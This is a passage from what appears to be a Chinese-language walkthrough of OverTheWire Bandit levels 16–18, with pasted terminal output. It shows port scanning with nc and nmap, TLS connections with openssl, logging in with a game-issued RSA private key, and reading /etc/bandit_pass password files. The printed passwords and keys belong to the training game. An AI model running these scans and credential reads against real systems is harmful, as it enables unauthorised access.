localhost 30000 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Correct! BfMYroe26WYalil77FoDi9qh59eK5xNr Connection closed by foreign host. bandit14@bandit:~$   level 16 发送需要ssl加密\n搜索得知SSL可用于加密任何基于TCP/IP的应用\n再搜索openssl的用法即可解出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  bandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof CONNECTED(00000003) depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1 --- Certificate chain 0 s:/CN=localhost i:/CN=localhost --- Server certificate -----BEGIN CERTIFICATE----- MIICBjCCAW+gAwIBAgIEYo1NxTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjAwMTA1MTQzNTU4WhcNMjEwMTA0MTQzNTU4WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKF4u2eu a8VipZPviX0hfNiCnaD2ojAffdBhKTy1bmZSNRuHPBDnU7z8rblNSknSjCITda1C GEAI8ZktRbtLpBTbYeTgqPN/EiN5UIRMKbU6P2O93zNFPBsmyfQLrgt+DSLnsxlB i/yYyT7WLdtNVBpgwRwkqi9K7dk9vf9waswLAgMBAAGjZTBjMBQGA1UdEQQNMAuC CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0 ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3 DQEBBQUAA4GBAJECW6IB3Ria4xG002BqD3zEbtmrDlK6nmJq+uQ4eJ6cT18o9REb npy/lFzlv2LfcrYAnuAp6Fh89MKaYjNzJURjRQ9RkmcYgQJa1n+OBkATb7V+84/a k9PDRkscxdNFMGBSvzFD33XZ5lbaGdrwCPyoxenoYghV/753wffN7J6H -----END CERTIFICATE----- subject=/CN=localhost issuer=/CN=localhost --- No client certificate CA names sent Peer signing digest: SHA512 Server Temp Key: X25519, 253 bits --- SSL handshake has read 1019 bytes and written 269 bytes Verification error: self signed certificate --- New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384 Server public key is 1024 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: 7EEA483CA2D18FE7CB98BB6A1CC800C7BE4444E492EBFD398DDA8EABD18712C2 Session-ID-ctx: Master-Key: D0D0B7463ABC8AD513D016BEBF3932F325BE53DBBA712624C9E820AB95735BF63FA59EAECFF34AE5523F2E05BC8BE5F2 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 56 e9 4e 87 6a 28 48 d0-13 42 5f b9 61 b0 dd d0 V.N.j(H..B_.a... 0010 - d6 bb 15 df 9d 3a 2c 9f-2d 88 a4 e2 b8 ec 36 de .....:,.-.....6. 0020 - 6c ba 2d ac d0 d4 0b 12-d1 76 ac cd 8f 8d 4d b9 l.-......v....M. 0030 - e4 8d 7f 9e 0b f5 2a 67-42 6c 52 08 94 27 09 75 ......*gBlR..'.u 0040 - 67 e5 8a 66 24 50 4f db-a7 9d 01 0d 81 ba b3 12 g..f$PO......... 0050 - c5 2e 8d ee ef 0a 2d 6d-a0 89 72 36 18 30 b2 24 ......-m..r6.0.$ 0060 - fa 82 0a b5 9d da d2 55-70 a7 fd 6d 3f 96 9e 85 .......Up..m?... 0070 - 8f e8 f8 8d 0e 29 0f 84-12 97 9c 31 7d 79 ef 75 .....).....1}y.u 0080 - f5 f9 f6 cc 74 29 58 a0-a9 48 f5 17 c4 1d 73 ba ....t)X..H....s. 0090 - f1 30 ce 52 12 b6 e2 c2-75 f9 94 b9 04 2a a9 d8 .0.R....u....*.. Start Time: 1581676007 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: yes --- BfMYroe26WYalil77FoDi9qh59eK5xNr Correct! cluFn7wTiGryunymYOu4RcffSxQluehd closed bandit15@bandit:~$   level 17 这道题要我们在给定范围内找出正确的端口，nc，nmap都可以用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218  bandit16@bandit:~$ nc -zv localhost 31000-32000 localhost [127.0.0.1] 31790 (?) open localhost [127.0.0.1] 31518 (?) open bandit16@bandit:~$ nmap localhost -p31000-32000 -v Starting Nmap 7.40 ( https://nmap.org ) at 2020-02-14 11:38 CET Initiating Ping Scan at 11:38 Scanning localhost (127.0.0.1) [2 ports] Completed Ping Scan at 11:38, 0.00s elapsed (1 total hosts) Initiating Connect Scan at 11:38 Scanning localhost (127.0.0.1) [1001 ports] Discovered open port 31518/tcp on 127.0.0.1 Discovered open port 31790/tcp on 127.0.0.1 Completed Connect Scan at 11:38, 0.04s elapsed (1001 total ports) Nmap scan report for localhost (127.0.0.1) Host is up (0.00026s latency). Not shown: 999 closed ports PORT STATE SERVICE 31518/tcp open unknown 31790/tcp open unknown Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds bandit16@bandit:~$ bandit16@bandit:~$ bandit16@bandit:~$ nmap localhost -p31000-32000 Starting Nmap 7.40 ( https://nmap.org ) at 2020-02-14 11:38 CET Nmap scan report for localhost (127.0.0.1) Host is up (0.00024s latency). Not shown: 999 closed ports PORT STATE SERVICE 31518/tcp open unknown 31790/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds bandit16@bandit:~$ bandit16@bandit:~$ bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1 --- Certificate chain 0 s:/CN=localhost i:/CN=localhost --- Server certificate -----BEGIN CERTIFICATE----- MIICBjCCAW+gAwIBAgIEGPttrzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjAwMjA5MjA0NzE5WhcNMjEwMjA4MjA0NzE5WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAPiElqK1 D097ZCNDgKFxqX1ZUUpFfuoiDSP2dw5KrIruaTQMmfqCxo6dSHvkj1sF//YRI28k BGyu9pE3zLO45uk4PrjoORYLoQjTCb61oVZLECCOIG21WQUbrhjW4zlZGmtWrqw6 zGLk7dZ8MeYHVSvK0n3Ar45hVedpsLC618ZTAgMBAAGjZTBjMBQGA1UdEQQNMAuC CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0 ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3 DQEBBQUAA4GBADJEAM0VceCYaqhfzpzkzf6dhCIWbb/8P+51Wxw24sn9iLHxdqYe 1WNfxtQb8IYb3q/6JJDJ3d6plNKmFMkFBe5AiN05PCDeMymkTv8vlKj18UNR/4GL AH1aFGcEYVXkwX0Kl844muUrK7S0AbOvcHmzzA++qTmfB1UK264G0iAH -----END CERTIFICATE----- subject=/CN=localhost issuer=/CN=localhost --- No client certificate CA names sent Peer signing digest: SHA512 Server Temp Key: X25519, 253 bits --- SSL handshake has read 1019 bytes and written 269 bytes Verification error: self signed certificate --- New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384 Server public key is 1024 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: EE1156EF7A043D8173A15CB87FC41D8BB3F61517B8414D62065541FD97928592 Session-ID-ctx: Master-Key: 2E3037DCB9B4278B13DF68BE8111918D2D978F1B5F190052A0435E6BDD2ACE5751723FB13856C5E98F01240F88914768 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 9f 82 12 97 ac 31 10 5b-65 4b 5d fb 71 e9 e8 02 .....1.[eK].q... 0010 - cc 56 9a 1f 91 2b c2 22-7e 93 d9 42 cd 60 56 ab .V...+.\"~..B.`V. 0020 - 89 76 d6 95 7a b7 7e c7-6f d3 a2 95 a5 ee f2 b4 .v..z.~.o....... 0030 - 4d 48 68 f1 bf 23 df 87-de dd 64 a5 24 1e 1c e7 MHh..#....d.$... 0040 - 0b c3 f4 b2 c4 72 b9 61-26 3c 17 dd 78 61 68 dd .....r.a\u0026\u003c..xah. 0050 - b8 59 36 15 76 19 6f 19-19 14 73 df 2d 8b 66 71 .Y6.v.o...s.-.fq 0060 - f2 83 0b 22 52 07 69 ba-83 15 0a cc 94 fe f9 07 ...\"R.i......... 0070 - 01 72 d2 18 de 60 42 c1-f5 8d 19 88 4b c9 74 bf .r...`B.....K.t. 0080 - ad f5 bf 2b 53 3b 42 ab-89 eb 0c 52 82 de 55 b3 ...+S;B....R..U. 0090 - e0 8d 53 85 17 d3 3a 8a-1e 80 71 09 54 5d 3c f8 ..S...:...q.T]\u003c. Start Time: 1581676499 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: yes --- cluFn7wTiGryunymYOu4RcffSxQluehd Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY----- closed bandit16@bandit:~$ openssl s_client -connect localhost:31518 -ign_eof CONNECTED(00000003) depth=0 CN = localhost verify error:num=18:self signed certificate verify return:1 depth=0 CN = localhost verify return:1 --- Certificate chain 0 s:/CN=localhost i:/CN=localhost --- Server certificate -----BEGIN CERTIFICATE----- MIICBjCCAW+gAwIBAgIES250rzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjAwMjA5MjA0NzIwWhcNMjEwMjA4MjA0NzIwWjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBANWyxh7K T86zWM4NFe95x2KNEBUDz2XlGvU7KxUM9z1OfakmLDYCiujYdR6gI4ZBtyhEql5P taCiNWO+ZDJCKWhjH/TyIywxjW9/PBHRC8UEzhsxc0wMHbLrlYFwzxT2KjhI3EVY 5VIWkzKrgHuON6PuBbmN0g0z5NN/xYch4kPpAgMBAAGjZTBjMBQGA1UdEQQNMAuC CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0 ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3 DQEBBQUAA4GBAFX4+KlTXWb4R/pUVt7i4FWvp3CuqgLUtgU3vRZqJ3wShIyDbsFK a4S9uSuWcLLvyq0aa4kLhmoepyNlI3BGUSZZbRXwo/1e5IpCX3RdHhlIc3/Sd7ln usTkejgEftWMmmBc03RY07EMxbNeXE8zzh2NP+5kVfwWG6GoGuQMXhy8 -----END CERTIFICATE----- subject=/CN=localhost issuer=/CN=localhost --- No client certificate CA names sent Peer signing digest: SHA512 Server Temp Key: X25519, 253 bits --- SSL handshake has read 1019 bytes and written 269 bytes Verification error: self signed certificate --- New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384 Server public key is 1024 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : TLSv1.2 Cipher : ECDHE-RSA-AES256-GCM-SHA384 Session-ID: 8F0B20A8164B9ED461FBD0721FA2A8AA489C77A00124ACE93381D0512F7A2740 Session-ID-ctx: Master-Key: F880B59CBA1854941DFA1C725F833F75B1177248D9651876542343A15AF9E24A45078F96FD305D27CFBE70486DF2EAA3 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 26 1a 05 91 72 ce a3 a6-e5 fa 17 b1 24 c4 2b 6f \u0026...r.......$.+o 0010 - 1d a9 b9 da 93 9a 35 e5-f1 7e fc 83 02 92 06 6a ......5..~.....j 0020 - d3 db 90 bb ec c3 bb c3-fe 8f a3 af 08 39 47 35 .............9G5 0030 - 61 90 8c 2b 82 e3 28 b3-16 e9 f9 6a 4c c1 59 2d a..+..(....jL.Y- 0040 - c3 50 40 7a ca b9 c0 54-c8 d9 0b 9b f0 2c 7b fa .P@z...T.....,{. 0050 - c7 a4 9a bf c7 f6 e6 0e-bf 07 dc 50 a3 bf 23 48 ...........P..#H 0060 - e9 0f f3 fb b9 b4 39 1d-c0 0d 71 e2 80 05 fe e7 ......9...q..... 0070 - ed 38 48 55 d7 f0 b7 97-f1 a1 c2 06 1b 47 7d 51 .8HU.........G}Q 0080 - 1e cc 4d e8 0e 76 73 0a-20 24 37 6f 20 c7 ca e7 ..M..vs. $7o ... 0090 - 5b bc 44 09 ad d6 8d 5c-e3 96 86 fd 7d d8 41 75 [.D....\\....}.Au Start Time: 1581676568 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: yes --- cluFn7wTiGryunymYOu4RcffSxQluehd cluFn7wTiGryunymYOu4RcffSxQluehd ^C bandit16@bandit:~$   nmap扫端口是真的快\nlevel 18 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  bl@bl-virtual-machine:~/wargame$ echo '-----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY-----' \u003e b16.rsa bl@bl-virtual-machine:~/wargame$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i b16.rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargames @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for 'b16.rsa' are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key \"b16.rsa\": bad permissions bandit17@bandit.labs.overthewire.org's password: bl@bl-virtual-machine:~/wargame$ chmod 600 b16.rsa bl@bl-virtual-machine:~/wargame$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i b16.rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit17@bandit:~$ cat /etc/bandit_pass/bandit17 xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn   之前没注意，ssh私钥需要600权限，登进去之后就顺手看了下密码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212  bandit17@bandit:~$ ls passwords.new passwords.old bandit17@bandit:~$ strings passwords.old 4d22drdsITVoHcfd8bAHeeKrdL3mMHpU QeGg8ya1PGU13yp57EWuUaxErl8VWjlM CUGTwQyhKs4fEQLH0UdD7ywCrYBDceZ7 2hUdQXUPpBJKzkslSHCOiC3ytdJ1cuqI WxgyH7990nLi81smXOeDGnKTpZTlAU3f g4diRjbnq4PhyC1rfuCaFXZmBLgHPmo6 MBf7rFYTik6DurpaVdC5mXngsTiXWwhv 3zt8L6QnDKXLGWhRvQBUczrk6O5KLl7i bm9g6Ypy9zVLojtpPaKBKViAKnL19QEY N2rkdeuoi1RBXCiCDQWlk4BU76M3wJFv PR0AOkN4NodK61ewgBHS56sEDr3LAobb CaVTEQzrWPuDvBm9D4CGL8BSC4arizFq FgheNL06s1UCW8UiuFUWSmtGedi2TxIH Lvh1gpC39tdJMAJH0atjJLF4yRlCoSH4 OpTHYem6UHMY2zLgwm2sI4e1faHw0M1b Z84471LxMWArPnxJGsMmvvl2qCcBXZ7M CExYI7LMdZLSj9AiFp8rutQY6uIcqdfx lC1IFZxlnj05ZuWKY5Ytad9bTZ0eMgYC 4OfOZR4CMqlUFgxw8nZbKtW3eJcZPrqn bbctuDOWMvYUCWAiY7APEUnYPUo0zYiT sCepFVPJBglEuU8uY0LllG1oIJ2HOvrH o9sp7odH3blIlshg2aCrWPdzuDq5lxx5 97Vd3224QGOfsPGwjURphDfn7ISeXd3S Tz97n5taD1ZskKSlC1WHDU1CZZ5I3PnM NDkYNzqHAZnjn7GoKk6kUjmBwLbZ5IjT pd1THzlzKbAnR9uPnI75EpXdZVUFyVD9 GGwbSfJpRjzYvNHb1n2riVU3VnxCSe9I qLufXtxv2XKcjrWDqIojlINiJhU9LYCp kpxAYarBToFo4Vsr1jDBQREvRtbUA9i2 s8ZEkk0YuNoA9YnyUvVwFy29cMIP4psJ m0q33SCpHDBfTL2yRb8Db2lb6qIX8hjf xhHqvStzyrj0k1eLNbiQHmadzlY80iZg FExGbU63PyeJsfxtoIaVjiFKXAhEon0C 04y09Cd0CvZBSnrC1BjauTj70D3P84Gw Kr58zsSpmfKy4ILtUqbo2hqooPHnI13L ruisEF4OA3MyOdLEFwVdW84ZwJXRioRT kN2hWkHUehtqqWpnZW1CulYiOv8RJwPl V045YMJnMGdta9yQD8ALdny0hholXmdw gZ5U640FLMMChheWKHNdaQ1lKzLuqjxZ Al0xVJb5bEzhnFG8nPFe6IJa2FjXVSzo CT2ZJy6MoLkTqdHuhL5zUIsW41WCntAA hlbSBPAWJmL6WFDb06gpTx1pPButblOA 46lUvvv0JJzyY0IOhWgGp5IjfsllmvaC FcSd4Me936rwbk2pAU9ylx9NXTrzdCaX vfU4mCzATtqUMNLg3a7mPs3OY6Dr4jaZ mOWgkKPfjXibrdfgG57CWMcbeqBRg4IU VudOaCtkUbhOdF7dE7KACOqH0R9weDhQ vzwsuF0cp5IrmEmGb7qNr4VUlsLi463t ymAqpKh2CPdC7iqFk4KcKdlXeKZqSrhW ta02hN70k7BoxfiVn7viAFoWKaGDOKnC bPLvqxn5BDtg4wy8c2uO0x7y3yi3RPMU VUcDEAfnRTt8nTlAd55q94L6rr0jfCCU QAIDBC5fx4bBOsyOd8NYItiPWGMaGXY9 X1NUQJrIsrNfaGHMUolOcepDiNss842e DAL411ARIMja2B3VibQxzNn8iqxCvtPB Gq0BvsinoaBAuqwLJwtWCSe1wMdiSBSZ RVO0eC5aK1WRlpKqPAglNSOPwc1OvUp8 XCBD77G8bknfL90F44o0Nbe1jqCBvxqh qOZOpK7UHdGgsZeQirx8wr9omjopkzuP nQ1IO5OUcJ4P8ZSrLYNQLFnWS32AMUcE oUpDAclcfOrSI10qeUCHqxvSxR0aXyrN uzPVdEpMDIvTBj3eB4mgmhEeCg1WEFqL WThihtgEnlmNQ6SAqROgERjyxNfgJZk5 l9sPHyleBjYNlZxQbHiCKNoeEfL7W3RA qfcmi6vHWL5CS7nqkHTcSdeRIoxDEGjU cI4zMnmzAP4Ei6FvZQ4vgvUhrhKYajGH MlKrQsbeU3cvq0GNIvwSMipBFUCHRLb4 yqPoTs4J1oNw6KqREjqQk1fXNxAtQzNN 6HgQNDvsu4VC7KBhIpQRCIRhLo4izRjG nPhoiXgdg3T385gjubCcKtnEa2kSQYiF BBWqlFI2IycHpCSESbmi8bgQ3XaRVkH9 zC5qgaooKVu5QNTtqEXcgPpmX2IXZcd5 BP8DJZaleBMYuyMzG96xJ6RDk6QUvLoi NsYnz4oTlDRKsDyWWVvseAeLnrVz80ul 2MVRp5Pej7Ngv3QlcfY9MhFrpm1EER3U niQz99Dp18DDLdpkqxatJEorlEuxbffD 0LZ5juRJ7Kpn9Y1d2tnXjZY5Qe5YsoSn DFkA6xfENw4qcgbyJOR1Lq4wHzoEzXf1 DuyGtXuifUSHgURCvn8wW8ZVGkMFEwCG lsp7PdEBOlGtgQaiZA1BMdxpHPA0YPCt fZPxMUd4y9F8Ty8W36yMVQRVxJ7M1n4B rNnhvIf0O32W7YkNFetirVBSHpxx8PVa IAvk989y4J29tuDjZlSUAcQJ0GKlSLA7 6h32PPx4KHY0pxOVSViJDOzjaidS79i5 3bCdLIIpnsFeobeQnORAVeM7dwvlRhYc VlaVTJjuHSNlmnukU27pLKfjQDcpFm0R jVxCHhuF6NHsDa6UdNHgBdNIDH7SZzCE tY71skfE2Y1Tez1451HdcwjueU9wWO9S JUplInoYI9VmMuoTU64WX9fQgljz0SRr YCScjMB7OB5QL8ZiPgyd7wRqlsqhjjGu 3fBUnc3gvyg7iyW1V4D0quYJPM3iNNy4 mrbw5khrpkAXdNfkTs6Eqzj8Am07I4CK crz9kBtBVlvTVZnvJ3AqfeFYuw89koZh uD036o50sDvVj9JU0ZMi76np4kE2SLw6 6QX3T8Ul4qgruVmX0Vx8h7H8GkTyAoZ1 EbdKERioX8ShHYhFCIFVIyvP13kL75jA QyRSUG1osue0Rrc114FF98YH7HjJWPgJ jMxInIjNK0ChvSQX10862VqCwIQsek95 2pqtLZiT8CzsalDfnn68FjdhbtgqEK1C 80JH1LNM5JFed5XQBVYeiKU5qNNqDjLS bandit17@bandit:~$ strings passwords.new 4d22drdsITVoHcfd8bAHeeKrdL3mMHpU QeGg8ya1PGU13yp57EWuUaxErl8VWjlM CUGTwQyhKs4fEQLH0UdD7ywCrYBDceZ7 2hUdQXUPpBJKzkslSHCOiC3ytdJ1cuqI WxgyH7990nLi81smXOeDGnKTpZTlAU3f g4diRjbnq4PhyC1rfuCaFXZmBLgHPmo6 MBf7rFYTik6DurpaVdC5mXngsTiXWwhv 3zt8L6QnDKXLGWhRvQBUczrk6O5KLl7i bm9g6Ypy9zVLojtpPaKBKViAKnL19QEY N2rkdeuoi1RBXCiCDQWlk4BU76M3wJFv PR0AOkN4NodK61ewgBHS56sEDr3LAobb CaVTEQzrWPuDvBm9D4CGL8BSC4arizFq FgheNL06s1UCW8UiuFUWSmtGedi2TxIH Lvh1gpC39tdJMAJH0atjJLF4yRlCoSH4 OpTHYem6UHMY2zLgwm2sI4e1faHw0M1b 